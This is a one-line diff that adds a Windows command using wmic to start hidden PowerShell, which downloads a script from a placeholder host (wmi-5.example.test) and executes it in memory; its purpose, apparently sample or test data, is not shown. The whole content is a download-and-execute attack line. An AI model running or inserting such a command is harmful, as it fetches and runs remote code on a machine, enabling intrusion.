@@ -1,0 +1,1 @@
+wmic process call create "powershell -w hidden -c iex (iwr 'http://wmi-5.example.test/e.ps1' -useb)"
